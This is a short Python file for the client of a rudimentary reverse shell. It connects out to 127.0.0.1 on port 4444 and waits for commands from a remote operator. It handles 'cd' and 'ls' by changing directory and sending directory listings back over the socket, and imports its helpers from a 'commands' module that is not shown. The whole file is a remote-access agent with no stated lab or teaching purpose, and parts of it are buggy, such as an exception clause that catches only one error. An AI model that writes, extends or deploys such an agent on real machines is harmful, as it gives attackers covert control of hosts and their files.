import socket as s
from commands import commands
import os

host = '127.0.0.1'  
port = 4444

sock = s.socket(s.AF_INET, s.SOCK_STREAM)
sock.connect((host, port))

def send_message(msg:str):
    sock.send(msg.encode())

while sock:
    try:
        cmd = sock.recv(1024).decode().strip()
        if not cmd:
            continue

        if cmd.startswith('cd '):
            is_dir_change = False
            chng_dir = cmd.split()[1]
            is_dir_change = commands.change_dir(chng_dir)

            if is_dir_change:
                send_message('Directory changed to {}'.format(chng_dir))
            else:
                send_message('Error : {}'.format(chng_dir))
                is_dir_change = False

            if chng_dir == 'back':
                if is_dir_change:
                    _getcwd = os.getcwd().split()
                    print(_getcwd)
                else:
                    send_message('Current directory is final')
                    


        elif cmd == 'ls':
            for listfiles in commands.list_files():
                send_message(listfiles)
        
        else:
            send_message('Invalid command found : {}'.format(cmd))

    except ConnectionRefusedError or ConnectionAbortedError:
        sock.close()

    except Exception as e:
        print(f"Client Error: {e}")
        sock.close()
        break
